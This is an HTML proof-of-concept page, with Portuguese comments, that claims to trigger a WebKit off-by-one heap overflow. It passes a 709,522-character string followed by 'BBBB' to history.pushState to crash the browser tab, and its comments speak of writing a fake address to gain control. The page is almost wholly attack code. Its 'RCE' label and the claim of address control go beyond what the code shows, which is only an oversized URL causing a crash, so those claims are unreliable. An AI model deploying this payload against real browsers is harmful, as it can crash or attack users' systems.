<!DOCTYPE html>
<html>
<head>
    <title>WebKit Userland RCE PoC</title>
</head>
<body>
    <h1>WebKit Heap Overflow (Off-by-One)</h1>
    <p>Target: 709,522 bytes (Safe) -> Overflow 4 bytes</p>
    
    <button onclick="runUserlandExploit()">TRIGGER OVERFLOW</button>
    <div id="log"></div>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += `> ${msg}<br>`;
        }

        function runUserlandExploit() {
            log("Criando payload...");

            // 1. O Limite Exato que você encontrou
            const LIMIT = 709522; 
            
            // 2. O Buffer Base (Seguro)
            const base = "A".repeat(LIMIT);
            
            // 3. O "Veneno" (The Poison)
            // Em vez de 1 byte aleatório, vamos tentar escrever um endereço falso.
            // 0x41414141 = "AAAA". Se o sistema tentar pular para este endereço, confirmamos controle.
            const overflow = "BBBB"; // Usando B para diferenciar do base

            const payload = "/" + base + overflow;

            log(`Tamanho Total: ${payload.length} bytes`);
            log("Injetando em history.pushState...");

            setTimeout(() => {
                try {
                    // Isso deve crashar a aba imediatamente
                    history.pushState({}, "poc", payload);
                    log("Sobreviveu? (Isso não deveria acontecer)");
                } catch(e) {
                    log("Erro JS: " + e.message);
                }
            }, 1000);
        }
    </script>
</body>
</html>
